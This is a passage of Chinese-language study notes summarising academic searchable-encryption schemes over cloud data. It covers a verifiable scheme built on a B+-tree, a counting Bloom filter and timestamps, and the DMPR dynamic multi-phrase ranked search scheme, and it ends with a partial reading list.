是一个验证器，当用户查询的关键字不存在时，它可以提供验证\n- 操作：\n  - 倒排索引 ∆ = <ω<sub>i</sub>,D<sub>ω<sub>i</sub></sub>> ，D<sub>ω<sub>i</sub></sub> = {f<sub>i</sub>,f<sub>j</sub>,f<sub>k</sub>...}\n  - 陷门： τ<sub>ω<sub>i</sub></sub> = F(K<sub>1</sub>,ω<sub>i</sub>)\n  - 关键字对应文档哈希值：V<sub>ω<sub>i</sub></sub> = ∑<sub>f<sub>i</sub>∈D<sub>ω<sub>i</sub></sub></sub> *IH*(G(K<sub>2</sub>,f<sub>i</sub>))\n  - 索引：I = I.Insert(∆,τ<sub>ω<sub>i</sub></sub>,V<sub>ω<sub>i</sub></sub>)\n  - π = (V<sub>ω<sub>i</sub></sub>,Sig(V<sub>ω<sub>i</sub></sub>))、π<sub>bf</sub> = (ψ<sup>n</sup><sub>bf</sub>,Sig(ψ<sup>n</sup><sub>bf</sub>))\n  - 数据所有者在本地存储数据 I 和 π<sub>bf</sub>，同时将 I、C、π 和 π<sub>bf </sub>发送到云服务器\n\n#### 预更新\n\nPreUpdate(K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，ssk，f) → {τ<sub>ω</sub>，π，π<sub>bf</sub>}\n\n- 输入：私钥 K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub> ，签名私钥 ssk，要更新的文件 f \n- 输出：更新 token τ<sub>ω</sub> ，认证器 π\n- 操作：数据所有者将 τ<sub>ω</sub>，π<sub>bf</sub> 和 π 发送到云服务器\n\n#### 更新\n\nUpdate(I，τ<sub>ω</sub>) → {I'}\n\n- 输入：安全索引 I ，更新 token τ<sub>ω</sub>\n\n- 输出：新的安全索引 I'\n\n#### 陷门\n\nTrapdoor(K<sub>1</sub>，ω) → {τ<sub>ω</sub>}\n\n由经过身份验证的用户运行，以生成给定关键字的陷门。\n\n- 输入：密钥 K<sub>1</sub>，关键字 ω\n\n- 输出：与 ω 对应的陷门 τ<sub>ω</sub>\n\n- 操作： τ<sub>ω<sub>i</sub></sub> = F(K<sub>1</sub>,ω<sub>i</sub>)\n\n#### 搜索\n\nSearch(I，τ<sub>ω</sub>，t<sub>q</sub>）→ {（ρ，π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，R<sub>ω</sub>）or（π<sub>bf</sub>）}\n\n- 输入：安全索引 I ，陷门 τ<sub>ω</sub>、查询时间 t<sub>q</sub>\n- 输出：搜索结果的路径列表 ρ，验证器 π<sup>t</sup><sub>q</sub>、π<sub>c</sub> 、搜索结果的加密文档 R<sub>ω</sub>\n- 操作：服务器将 ρ，π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，R<sub>ω</sub> 发送给用户，或者输出一个校对验证器 π<sub>bf</sub>\n\n#### 验证\n\nValidation(K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，spk，R<sub>ω</sub>，ρ，π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，τ<sub>ω</sub>，π<sub>bf</sub>) → {0,1}\n\n- 输入：对称密钥 K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，公钥 spk，查询结果 R<sub>ω</sub>，安全列表 ρ，认证器 π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，π<sub>bf</sub> ，ω对应的令牌 τ<sub>ω </sub>\n- 输出：用户接受查询结果返回 1 ，拒绝查询结果返回 0 \n\n### 4、方案构建\n\n#### 安全索引\n\n- 使用 B<sup>+</sup> 树结构来构建安全索引，索引是根据文档集合 D 和倒排列表 ∆ 构建\n\n- 完整倒排列表包括四部分：<ω<sub>i</sub>,D<sub>ω<sub>i</sub></sub>,τ<sub>ω<sub>i</sub></sub> ,V<sub>ω<sub>i</sub></sub>>\n  - 关键字 \n  - 关键字对应文档\n  - 关键词对应的陷门(Token) \n  - 关键字对应文档的哈希值\n\n为了防止云服务器发起重放攻击，并保证根的新鲜度，为验证者维护了一个时间戳链，这样用户就可以跟踪链中的身份验证者，并确保根是否新鲜。\n\n数据所有者根据下式生成验证者\n\n![](https://img.jwt1399.top/img/202206211855766.png)\n\n- i 表示第 i 个更新间隔，j 表示该间隔内的第 j 个验证器\n\n- ν<sub>i,j</sub> 代表 B<sup>+</sup>-Tree 的时间戳 tp<sub>i,j </sub>和根 rt<sub>i,j </sub>的加密\n- π<sub>i,j </sub>包含了ν<sub>i,j </sub>和数据所有者对 ν<sub>i,j</sub> 的签名\n\n根据下式计算 π<sub>bf </sub>，π<sub>bf </sub>是一个维护时间戳链和签名的验证器\n\n![](https://img.jwt1399.top/img/202206211855143.png)\n\n由于普通的 Bloom Filter 不支持动态更新。所以我们引入了 CBF，CBF 是一个 Counting Bloom Filter，本文中用它存储所有 token\n\n假设数据所有者有三个令牌，服务器通过四个散列函数将其散列到 Bloom Filter。\n\n假设用户给查询一个令牌。服务器检查 CBF 中是否有一个 τ<sub>ω<sub>i</sub></sub>对应，云服务器只需要检查对应的位置是否都是 1。如果全为 1，则要查询的 τ<sub>ω<sub>i</sub></sub> 存在，否则不存在。\n\n如下图所示，如果有两个关键字，被 3 个哈希函数散列到 Bloom Filter，CBF 对于加法操作，相应的位增加 1，删除操作对应的位减少 1\n\n#### 查询过程\n\n当授权用户需要查询云服务器的数据时，用户首先为关键字生成一个陷门 token，然后用户将 token 发送到云服务器，云服务器执行搜索算法，具体算法如下图所示\n\n<img src=\"https://img.jwt1399.top/img/202206211855595.png\" style=\"zoom:50%;\" />\n\nSearch(I，τ<sub>ω</sub>，t<sub>q</sub>）→ {（ρ，π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，R<sub>ω</sub>）or（π<sub>bf</sub>）}\n\n当云服务器接收到用户发送的 token 时，考虑两种情况: 在索引中 token 存在或不存在。\n\n服务器只需要将查询的 token 散列到另一个具有 k 个散列函数的 CBF。服务器通过测试对应位是否全部为 1 来验证用户查询到的 token 是否存在。\n\n- 1、如果不是所有测试位都是 1，则证明 token 不存在。在这种情况下，服务器只需要返回 π<sub>bf</sub> 给用户，而不需要遍历 B<sup>+</sup>-Tree。搜索复杂度是 O(1) \n- 2、如果所有测试位均为 1，则证明 token 存在。然后服务器需要搜索 B<sup>+</sup>-Tree 索引，并返回搜索路径 σ  =  (r<sub>0</sub>,...,r<sub>i</sub>,...,r<sub>m</sub>) ← I.search(τ<sub>ωi</sub>) 中每个节点的 token，从底部到根，不包括叶节点本身。r<sub>i</sub> ∈ {IN;LN}，IN 为内部节点，LN 为叶节点\n\n注意，对于内部节点，我们还需要返回不在搜索路径 σ 中的 token。然后，服务器需要找到验证器 π<sup>t</sup><sub>q</sub> 和校验点 π<sub>c</sub>，且校验点 π<sub>c</sub> 与查询时间相近。服务器发送 ρ，π<sup>t</sup><sub>q</sub>，π<sub>c</sub>，C<sub>ωi</sub> 给用户\n\n#### 验证结果\n\n为了验证数据完整性，我们使用哈希函数将 B<sup>+</sup>-Tree 的每个节点从叶节点逐层哈希到根节点。用户可以根据根节点验证查询结果的完整性。另一种方法是，数据所有者只对所有叶节点进行散列。本文采用时间戳机制来验证数据的新鲜度。\n\n时间戳机制如图7所示。它包括更新间隔和验证者π。更新间隔由数据所有者根据更新频率设置。验证器由根和 B<sup>+</sup>-Tree 的时间戳组成。\n\n为了防止服务器返回查询结果的部分版本或历史版本。授权用户在收到云服务器发来的查询结果后，执行验证算法。同样，在两种情况下，结果得到了验证。一种是关键字不存在，另一种是关键字存在\n\n当查询到的关键字不存在时，可以通过πbf验证器验证该关键字是否真的不存在。通过验证算法，用户可以验证服务器是否是恶意的。\n\nCBF验证器由带时间戳的CBF Bloom Filter和数据所有者的相应签名组成。\n用户可以通过CBF检查token是否存在。\n通过时间戳机制可以检测CBF的新鲜度。\n如果验证算法返回1，则用户接受服务器的结果。否则，它将拒绝返回的结果。用户可以证明该服务器是否是恶意的。验证的复杂度为O(1)。用户的成本可以忽略不计。\n\n当搜索的关键字存在时，用户需要根据服务器返回的结果构建B+-Tree的根，并使用根来验证搜索结果的完整性。结果的新鲜度基于解密验证器中的时间戳进行验证。用户可以根据服务器返回的列表构建根，并通过与验证者的根进行比较来验证返回结果的完整性。\n\n让我们通过下面的例子来解释什么是重放攻击。让我们考虑以下情况:\n\n当用户在t1(见图7)查询时，其中t1<tpi,0，服务器只能返回πi−1,n给用户。当用户在t2查询tpi,0的数据更新事件后，服务器有两个选项:一个是返回验证者πi,0给用户;另一种是验证方发送πi−1,n给用户。当服务器向用户返回πi−1,n时，发起新鲜度攻击。\n\n#### 更新操作\n\n更新算法更新服务器上的安全索引，支持三种操作，即添加、删除和编辑操作。\n\n数据所有者首先执行预更新算法，为更新算法、CBF 和签名创建 token，并将它们发送到云服务器。\n\n然后，云服务器执行更新算法对 CBF 和安全索引 I 进行更新。\n\n因为安全索引和文件都是加密的。服务器无法从中学到任何有用的东西。\n\n对于加法运算，数据所有者需要生成 {τω，G<sub>K<sub>2</sub></sub>(f)} 对，其中 τ<sub>ω</sub> 是从文件 f 中提取的特定关键字的标记，G<sub>K2</sub>(f) 是 f 的伪随机字符串。\n\n云服务器根据其 token 和值 {IH<sub>K<sub>2</sub></sub>(f) }找到对应的叶节点。如果令牌没有对应的叶节点，则会创建一个新的叶节点。计数布卢姆滤波器中相应的位也需要增加1(见图5)。验证器πbf和π也需要根据数据进行更新\n\n\n\n#### 方案示例\n\n假设有 9 个文件需要初始化，即 D = {f<sub>1</sub>、f<sub>2</sub>、f<sub>3</sub>、f<sub>4</sub>、f<sub>5</sub>、f<sub>6</sub>、f<sub>7</sub>、f<sub>8</sub>、f<sub>9</sub>}，其中包含 9 个关键字\n\n**倒排索引**\n\n<img src=\"https://img.jwt1399.top/img/202206211855312.png\" style=\"zoom:50%;\" />\n\n数据所有者将所有 token 散列到 CBF，并生成 π<sub>bf</sub> 和验证器 π。\n\n**安全索引**\n\n通过将 (token-value) 键值对插入到 B<sup>+</sup>-Tree 中来构建安全索引\n\n![](https://img.jwt1399.top/img/202206211855816.png)\n\n**更新**\n\n添加新文件 f<sub>10</sub> = {ω<sub>5</sub>，ω<sub>10</sub>}，更新 token 和 value 分别为 [' 4af8 '，IH(GK2(f10))]和[' ff56 '，IH(GK2(f10))]。\n\n- 对于已经存在的 token '4af8'，服务器需要在原始节点之后添加 IH(GK2(f10))。\n\n- 对于新 token 'ff56'，服务器需要创建一个新节点，并给它分配一个新值 IH(GK2(f10))。\n\n- 数据所有者需要验证 π<sub>bf</sub> 和 π\n\n**查询**\n\n假设用户想要查询关键字 ω<sub>3</sub> 并提交相应的 token '30ba'\n\n- 服务器收到用户的 token 后，首先测试该 token 是否存在于 CBF 中\n\n- 如果存在，服务器将向用户搜索它。该 token 的搜索路径为 { IN1, LN2 }，搜索列表为ρ = [M<sub>r2</sub>,M<sub>r1</sub>,M<sub>r0</sub>]\n\n- 当用户从服务器收到结果列表 ρ 时，运行验证算法\n\n- 用户可以根据列表 ρ 生成根哈希\n  - 例如，如果存在攻击，服务器只返回文件 f3。用户可以重新构建根哈希值，该哈希值将与验证器的根不相同。所以它会返回0。如果它们相等，则证明服务器为用户返回正确的结果。\n\n\n![](https://img.jwt1399.top/img/202211151614139.png)\n\n\n\n假设用户提交了一个索引中不存在的 token ，例如 token = '30bb'\n\n服务器只需要发送给用户一个验证者 π<sub>bf</sub> 。用户验证签名，然后将查询到的 token 散列到 CBF' 中。通过比较验证者 π<sub>bf</sub> 中解密的 CBF' 和 CBF，验证了结果的正确性\n\n## ⑫DMPR方案\n\n**论文名称：《Dynamic Multi-Phrase Ranked Search over Encrypted Data with Symmetric Searchable Encryption》**\n\n- 作者：郭成; 陈雪; 英默杰; 傅张杰; 李明初; 冯斌\n- 单位：大连理工大学\n- 会议：[IEEE Transactions on Services Computing](https://ieeexplore.ieee.org/document/8089767)【CCF B】\n- 时间：2017年10月\n\n| 多关键字 | 模糊搜索 | 可验证 | 动态更新 | 排名 |\n| :------: | :------: | :----: | :------: | :--: |\n|    ✅     |    ❌     |   ✅    |    ✅     |  ✅   |\n\n### 1、总体思路\n\n本文提出了**一种对加密云数据的多短语排名搜索**，该搜索还**支持动态更新**操作。使用**倒排索引**来记录关键字的位置，并判断该短语是否出现。此索引可以有效地搜索关键字。为了对结果进行排名并保护相关性评分的隐私性，在客户端的搜索过程中采用了**相关性评分评估模型**。此外，索引的特殊构造使方案具有动态性。数据所有者可以以非常低的成本更新云数据。通过安全分析和广泛实验，验证了所提方案的安全性和有效性。\n\n- 本文中要解决的问题是如何设计一个**支持动态**、**多短语**、**排名搜索**的可搜索加密系统。\n\n- 多短语排名搜索可以**按相关性条件的排名顺序返回文件**。排名搜索提高了传统搜索方法的实用性。\n\n- 该方案是轻量级短语对称可搜索加密（LPSSE）和动态对称可搜索加密（DSSE）的扩展\n\n### 2、使用技术\n\n- 倒排索引\n- TF-IDF \n\n### 3、方案概述\n\n动态多短语排名可搜索加密方案包含九种算法（**KeyGen，Trapdoor，BuildIndex，Search，Verify，AddToken，Add，DeleteToken和Delete**）。该方案由四个阶段的九种算法组成\n\n#### Setup\n\n数据所有者执行 **KeyGen** 和 **BuildIndex** 来初始化索引 I\n\n首先，数据所有者通过执行算法 KeyGen 生成密钥，这些密钥用于加密文件集合 F 并构建索引 I\n\n然后，数据所有者使用 BuildIndex 处理文件集合，数据所有者收集有关文件中关键字的信息，并以安全的方式将其存储在索引中。\n\n在 Setup 阶段，数据所有者还应与一组授权数据用户共享必要的密钥（例如，在本例中为用于生成搜索令牌的密钥）\n\n#### Retrieval\n\n数据用户使用 **Trapdoor** 生成与待搜索短语相对应的安全搜索令牌，并将其发送到云服务器。\n\n当云服务器收到搜索令牌时，它将搜索索引 I ，并获取有关候选文件的一组信息。\n\n术语“候选文件”是指构成这些文件中显示的短语的单词。在此阶段，云服务器仅返回索引的部分信息 I 到数据用户。\n\n#### Verify\n\n当从云服务器接收信息时，数据用户将使用 Verify 验证目标短语是否出现在这些文件中。\n\n在此过程中，数据用户将检查构成短语的关键字是否连续出现在文件中。\n\n还将计算短语的 TF-IDF 并对结果进行排名，根据排名结果，数据用户可以向云服务器询问感兴趣的文件。\n\n#### Update\n\n当数据所有者想要将文件添加到文件集合或从中删除文件时，首先，他应该生成 addToken 或 deleteToken 并将其发送到云服务器。当云服务器收到 Token 时，它将更新索引 I 和文件集合 C 通过执行“Add or Delete”。\n\n### 4、方案实现\n\n#### K←Keygen(1<sup>k</sup>)\n\n- K = (x，y，z，s，r)← {0, 1}<sup>k</sup>\n\n#### (I,C)←BuildIndex(F,k)\n\n`索引 I` 主要由**搜索列表 A<sub>s</sub>** 和**更新列表 A<sub>u</sub>** 组成，**搜索表 T<sub>s</sub>** 和**更新表 T<sub>u</sub>** 用于确定列表的头部\n\n数据所有者有一个文件集合 F = (f<sub>1</sub>，f<sub>2</sub>，...，f<sub>n</sub>) 和关键字集合 W = (w<sub>1</sub>，w<sub>2</sub>，...，w<sub>m</sub>)，搜索列表 A<sub>s</sub> 和搜索表 T<sub>s</sub> 用于搜索操作。\n\n- 对于每个关键字 w<sub>i</sub> ∈ W，都有一个与之相关联的列表 L<sub>w<sub>i</sub></sub>，列表中的节点数为 |F<sub>wi</sub>|\n\n- 如果有一个文件包含关键字 w<sub>i</sub> ，我们将在列表 L<sub>w<sub>i</sub></sub> 中添加一个节点，为了找到列表 L<sub>w<sub>i</sub></sub> 的头部，我们将头部的地址存储在搜索表 T<sub>s</sub> 中。\n\n- 为了高效地更新文件集合，我们使用更新列表 A<sub>u</sub> 和更新表 T<sub>u</sub>，对于每个文件 f<sub>j</sub> ∈ F，我们建立一个列表 L<sub>f<sub>j</sub></sub> 来记录其中所有不同的单词。使用更新列表，我们可以更新索引，而不需要重新构建整个索引。\n\n\n![](https://img.jwt1399.top/img/202206211856909.png)\n\n- 1.设 T<sub>s</sub> 和 T<sub>u</sub> 是大小为 |W| 和 |F| 的字典\n\n- 2.对于关键字 w<sub>i</sub> ∈ W\n- a>产生 k<sub>i,0</sub> ← {0,1}<sup>l</sup>\n  \n- b>创建 |F<sub>w</sub>| 个节点的 L<sub>wi</sub> 列表 (N<sub>1</sub>, N<sub>2</sub>, ..., N<sub>|F<sub>w</sub>|</sub>)，每个节点 value = N<sub>k<sub>i,j-1</sub></sub>(g<sub>x</sub>(w<sub>i</sub>) || id(f<sub>j</sub>) || π<sub>s</sub>(loc) || φ<sub>z</sub>(addr+1) || k<sub>i,j</sub>)，并将 value 存储在 A<sub>s</sub>[(φ<sub>z</sub>(addr)]\n  \n  - **id(f<sub>j</sub>)**  是文件 f<sub>j</sub> 的标识符\n  \n  - **π<sub>s</sub>(loc)**  是 w<sub>i</sub> 在文件 f<sub>j</sub> 中的所有位置 \n  \n  - **φ<sub>z</sub>(addr+1)** 是下一个节点的索引\n  \n  - 最后一个节点 N<sub>|F<sub>w</sub>|</sub>，value 为 φ<sub>z</sub>(addr+1) 设置为无效值。\n    - c>在搜索表 T<sub>s</sub> 中，存储 value 为 (g<sub>x</sub>(w<sub>i</sub>) , <φ<sub>z</sub>(addr) || k<sub>i,0</sub> > ⊕ f<sub>y</sub>(w<sub>i</sub>))，其中 φ<sub>z</sub>(addr) 是列表 L<sub>wi </sub>的头节点位置\n\n- 3.对于在 F 中的文件 f<sub>i</sub> \n  - a>产生 k<sub>i,0</sub> ← {0,1}<sup>l</sup>\n  \n  - b>创建包含 | f<sub>i</sub> | 节点的列表 L<sub>f<sub>i</sub></sub>，定义 value =  N<sub>k<sub>i,j-1</sub></sub>(g<sub>x</sub>(id(f<sub>i</sub>)) || g<sub>x</sub>(w<sub>j</sub>) || f<sub>y</sub>(w<sub>j</sub>) || φ<sub>z</sub>(addr+1) || k<sub>i,j</sub>)，并将 value 存储在 A<sub>u</sub>[(φ<sub>z</sub>(addr)]\n  \n  - c>在更新表 T<sub>u</sub> 中存储 (g<sub>x</sub>(id(f<sub>i</sub>)), <φ<sub>z</sub>(addr) || k<sub>i,0</sub>> ⊕ f<sub>y</sub>(id(f<sub>i</sub>))) \n  \n- 4.使用私钥加密 F 中的每个文件 f，得到 C\n\n- 5.输出(I,C)，其中 I 定义为 (T<sub>s</sub>，A<sub>s</sub>，T<sub>u</sub>，A<sub>u</sub>)， C 定义为 (c<sub>1</sub>，c<sub>2</sub>，. . . ， c<sub>n</sub>)\n\n#### T<sub>p</sub> ← Trapdoor(phrase,K)\n\n- 1.解析短语为 (w<sub>1</sub>，w<sub>2</sub>，. . . ,  w<sub>p</sub>)\n\n- 2.对于关键字 w<sub>i</sub> ∈ phrase，T<sub>w<sub>i</sub></sub> = (g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>))\n- 3.输出 T<sub>p</sub> = (T<sub>w<sub>1</sub></sub>, T<sub>w<sub>2</sub></sub>, ..., T<sub>w<sub>p</sub></sub>)\n\n####  info←Search(I,T<sub>p</sub>)\n\n- 1.如果 ｜phrase｜ = 1 \n  - a>解析 T<sub>p</sub> 为 (α, β)\n  - b>在搜索表 T<sub>s</sub> 中搜索 α\n  - c>设<ℇ || *k*> = T<sub>s</sub>[α] ⊕ β\n  - d>使用密钥 *k* 解密节点 A<sub>s</sub>[ℇ] ，然后逐个解密列表中的节点\n  - e>将列表中包含的节点输出为 info\n\n- 2.如果 ｜phrase｜ > 1 \n  - a>解析 T<sub>p</sub> 为 (T<sub>w<sub>1</sub></sub>，T<sub>w<sub>2</sub></sub>，...，T<sub>w<sub>p</sub></sub>)\n  - b>对于 T<sub>w<sub>i</sub></sub> ∈ T<sub>p</sub>，执行（1），并获取列表中包含的所有节点\n  - c>将列表中包含的节点输出为 info\n\n如果我们假设数据用户想要搜索一个短语 p = (w<sub>1</sub>, w<sub>2</sub>)\n\n- 首先，生成一个搜索令牌 T<sub>p</sub> = (T<sub>w<sub>1</sub></sub>, T<sub>w<sub>2</sub></sub>)，其中 T<sub>w<sub>i</sub></sub> = {g<sub>x</sub>(w<sub>i</sub>)，f<sub>y</sub>(w<sub>i</sub>)}\n- T<sub>w<sub>1</sub></sub> =  {g<sub>x</sub>(w<sub>1</sub>)，f<sub>y</sub>(w<sub>1</sub>)} = (α<sub>1</sub>, β<sub>1</sub>)、T<sub>w<sub>2</sub></sub> =  {g<sub>x</sub>(w<sub>2</sub>), f<sub>y</sub>(w<sub>2</sub>)} = (α<sub>2</sub>, β<sub>2</sub>)\n- 在搜索表 T<sub>s</sub> 中搜索 α<sub>1</sub> 和 α<sub>2</sub>，计算 <ℇ<sub>1</sub> || *k*> = T<sub>s</sub>[α<sub>1</sub>] ⊕ β<sub>1</sub> 和  <ℇ<sub>2</sub> || *k*> = T<sub>s</sub>[α<sub>2</sub>] ⊕ β<sub>2</sub>，\n  - 即 <φ<sub>z</sub>(addr<sub>1</sub>) || k<sub>1,0</sub>> = T<sub>s</sub>[g<sub>x</sub>(w<sub>1</sub>)] ⊕ f<sub>y</sub>(w<sub>1</sub>) 和 <φ<sub>z</sub>(addr<sub>2</sub>) || k<sub>2,0</sub>> = T<sub>s</sub>[g<sub>x</sub>(w<sub>2</sub>)] ⊕ f<sub>y</sub>(w<sub>2</sub>) \n\n- 服务器在 A<sub>s</sub> 中找到对应列表 L<sub>w<sub>1</sub></sub> = A<sub>s</sub>[ℇ<sub>1</sub>]  和 L<sub>w<sub>2</sub></sub> = A<sub>s</sub>[ℇ<sub>2</sub>] \n- 然后，服务器解密 L<sub>w<sub>1</sub></sub> 和 L<sub>w<sub>2</sub></sub> 列表的所有节点，并返回文件包含 w<sub>1 </sub>和 w<sub>2 </sub>两者的节点 info\n\n#### I<sub>p</sub>←Verify(info,T<sub>p</sub>)\n\n- 1.解析 info 为 (L<sub>1</sub>，L<sub>2</sub>，. . . ， L<sub>|phrase|</sub>)\n\n- 2.对于 L<sub>i </sub>∈ info，解密节点并获取关键字的位置 π<sub>s</sub>(loc)\n- 3.如果短语中的关键字在同一个文件 f 中连续出现，则将文件标识符添加到 I<sub>p</sub>，用频率来计算短语出现的次数\n  - I<sub>p</sub> 表示包含短语 p 的文件标识符\n\n- 4.对于 I<sub>p</sub> 中的每个文件，用频率和文件长度计算 TF-IDF 值，并在 I<sub>p </sub>中排序。\n- 5.输出排序后的结果 I<sub>p</sub>\n\n当数据用户收到节点的信息时，将用它们来查找包含短语 p 的文件，这里假设短语 p 出现在 f<sub>1</sub>，f<sub>2</sub> 和 f<sub>3</sub> 中。数据使用者计算短语 p 在 f<sub>1</sub>, f<sub>2</sub> 和 f<sub>3</sub> 中的相关性得分。\n\n![](https://img.jwt1399.top/img/202206211856699.png)\n\n由表可知，相关得分分别为 2.17、5.21 和 3.43。数据用户可以根据这些相关性得分对文件进行排序，并获得排序结果。从表中，我们知道 f<sub>2 </sub>是与查询请求最相关的文件，而 f<sub>1</sub> 是最不相关的文件。数据用户可以获得排序结果，并从服务器请求所需的文件。\n\n#### (T<sub>a</sub>,c<sub>f</sub>)←AddToken(f,K)\n\n- 1.设 (w<sub>1</sub>，w<sub>2</sub>，. . . ，w<sub>f</sub>) 是文件 f 中出现的关键字\n- 2.设 Add token T<sub>a</sub> = (α<sub>1</sub>, α<sub>2</sub>,  . . . ,  α<sub>f</sub>, β, λ<sub>1</sub>, . . . , λ<sub>f</sub>), 对于 i ∈ [1, 2, ..., f]\n  - **α<sub>i</sub>** 为 (g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>), id(f), π<sub>s</sub>(loc), k<sub>i+1</sub>)\n  - **β** 为 (g<sub>x</sub>(id(f)), f<sub>y</sub>(id(f)), k<sub>0</sub>)\n  - **λ<sub>i</sub>** 为 (g<sub>x</sub>(id(f)), g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>), k<sub>i+1</sub>)\n\n- 3.对于文件 f，使用对称加密方案将其加密为 c<sub>f</sub>\n- 4.输出 (T<sub>a</sub>, c<sub>f</sub>)\n\n#### T<sub>d</sub>←DeleteToken(f,K)\n\n- 输出 Delete Token T<sub>d </sub> = (g<sub>x</sub>(f), f<sub>y</sub>(f))\n\n#### (I',C')←Add(I,C,T<sub>a</sub>,c)\n\n- 1.解析 T<sub>a</sub> 为 (α<sub>1</sub>, α<sub>2</sub>,  . . . ,  α<sub>f</sub>,  β,  λ<sub>1</sub>,  . . .,  λ<sub>f</sub>)\n- 2.解析 β 为 (β<sub>1</sub>, β<sub>2</sub>, *k'*)\n- 3.在更新表中 T<sub>u</sub> 添加一个新的条目 (β<sub>1</sub>, <φ<sub>z</sub>(addr) || *k'*> ⊕ β<sub>2</sub>)\n- 4.对于 i ∈ [1,2,..., f]，解析 α<sub>i</sub> 为 (α<sub>1</sub>, α<sub>2</sub>, γ, β, π',*k'*)，在搜索表 T<sub>s</sub> 搜索 α<sub>i</sub> ，设 <ℇ || *k*> = T<sub>s</sub>[α<sub>1</sub>] ⊕ α<sub>2</sub>，计算  N<sub>k</sub>(α<sub>1</sub> || γ || π' || φ<sub>z</sub>(addr+1) || *k'*) ，并将此节点添加到列表   L<sub>w<sub>i</sub></sub> 的末尾\n- 5.在更新列表 A<sub>u</sub> 中添加一个新列表 L<sub>f</sub>\n- 6.对于 i ∈ [1,2,..., f]，解析 λ<sub>i</sub> 为 (λ<sub>1</sub>, λ<sub>2</sub>, λ<sub>3</sub>, *k'*)，在 L<sub>f</sub> 存储 N<sub>k</sub>(λ<sub>1</sub>|| λ<sub>2</sub> || λ<sub>3 </sub>|| φ<sub>z</sub>(addr+1) || *k'*) \n- 7.将密文 c 添加到文件集合 C\n\n添加一个文件。假设数据所有者想添加一个包含关键字 w<sub>1 </sub>和 w<sub>2 </sub>的新文件 f<sub>5 </sub>\n\n首先，他应该生成一个添加令牌 T<sub>a</sub> = (info<sub>a</sub>, c<sub>5</sub>)，其中 c<sub>5 </sub>表示 f<sub>5 </sub>对应的加密文件，info<sub>a</sub> 表示服务器必须添加到索引的节点信息。当服务器接收到“添加令牌”时，索引必须按照如下方式更新。\n\n- 首先，在更新列表 A<sub>u </sub>中添加一个包含文件 f<sub>5 </sub>的新列表 L<sub>f5</sub> ，在 L<sub>f5</sub> 中的节点将存储 f<sub>5</sub> 中出现的所有关键字\n\n- 在更新表 T<sub>u </sub>中，添加一个新的条目 T<sub>u </sub>[g<sub>x</sub>(f<sub>5</sub>)]\n- 服务器通过将条目 g<sub>x</sub>(f<sub>5</sub>) 设置为列表 L<sub>f5</sub> 的头部来更新更新表\n\n由于关键字 w<sub>1 </sub>和 w<sub>2 </sub>出现在文件 f<sub>5 </sub> 中，服务器还应该更新搜索列表 L<sub>w1</sub> 和 L<sub>w<sub>2</sub></sub> ，服务器根据搜索表 T<sub>s</sub> 获取列表  L<sub>w<sub>1</sub></sub> 和 L<sub>w<sub>2</sub></sub> 的头部，并在列表中添加新的节点。\n\n#### (I',C')←Delete(I,C,T<sub>d</sub>)\n\n- 1.解析 T<sub>d</sub> 为 (α, β)\n- 2.在更新表中 T<sub>u</sub> 中搜索 α\n- 3.设<*ℇ* || *k*> = T<sub>u</sub>[α] ⊕ β\n- 4.使用密钥  *k* 解密节点 A<sub>u</sub>[ℇ] ，然后逐个解密列表中的节点，服务器将从这些节点获取文件 f 中包含的所有关键字，这里，我们假设文件 f 包含关键字 (w<sub>1</sub>，w<sub>2</sub>，. . . ， w<sub>f</sub>)，服务器将定位 L' =  (L<sub>1</sub>，L<sub>2</sub>，. . . ， L<sub>|phrase|</sub>)的右边开始，服务器将从更新表 T<sub>u</sub> 中删除条目 T<sub>u</sub>[α]\n- 5>对于列表 L<sub>wi </sub>∈ L'\n  - a>逐个解密列表中的节点\n  - b>如果 id(f<sub>j</sub>) 的值等于 id(f)，请删除此节点\n- 6.删除文件集合 C 中的密文 c\n\n删除一个文件。假设数据所有者希望删除包含关键字 w<sub>1 </sub>和 w<sub>3 </sub>的现有文件 f<sub>1</sub>\n\n首先，他应该生成一个删除令牌 T<sub>d</sub> = (g<sub>x</sub>(f<sub>1</sub>), f<sub>y</sub>(f<sub>1</sub>))，并将其提交给服务器。\n\n- 当服务器收到删除令牌时，可以在更新表 T<sub>u</sub> 中找到文件 f<sub>1</sub> 对应的条目，服务器计算  T<sub>u</sub> = [g<sub>x</sub>(f<sub>1</sub>)⊕f<sub>y</sub>(f<sub>1</sub>)]，得到列表 L<sub>f1</sub> 的头部。\n\n- 之后，服务器获取文件 f<sub>1</sub> 中包含的关键字，例如 (g<sub>x</sub>(w<sub>1</sub>), f<sub>y</sub>(w<sub>1</sub>)) 和 (g<sub>x</sub>(w<sub>3</sub>), f<sub>y</sub>(w<sub>3</sub>))\n\n当删除一个文件时，服务器应该同时更新搜索列表和更新列表。根据列表 L<sub>f1</sub> 的信息，服务器可以在搜索表中找到列表 L<sub>w1</sub> 和 L<sub>w3</sub> 的开始位置，并删除节点 (w<sub>1</sub>, f<sub>1</sub>) 和 (w<sub>3</sub>, f<sub>1</sub>) 。然后，服务器将从文件集合 C 中删除加密文件 c<sub>1</sub>\n\n\n##  📌待看\n\n[加密云数据下基于Simhah的模糊排序搜索](http://cjc.ict.ac.cn/online/onlinepaper/yy-2017210100801.pdf?msclkid=4929d702cedb11ec8a28f935b8f6c6f0)\n\n[ 矩阵在信息加密中的应用(密码学)_Juanrr的博客-CSDN博客_矩阵加密](https://blog.csdn.net/weixin_43809290/article/details/84636189?msclkid=5154879fcedc11ecb52657f242c84a13)\n\n[CN107220343 基于局部敏感哈希的中文多关键词模糊排序密文搜索方法 (wipo.int)](https://patentscope2.wipo.int/search/zh/detail.jsf?docId=CN205434118&_cid=JP1-L2XESV-63489-3)\n\n[对云中加密数据进行隐私保护的多关键字模糊搜索](https://ieeexplore.ieee.org/abstract/document/6848153)【CCF 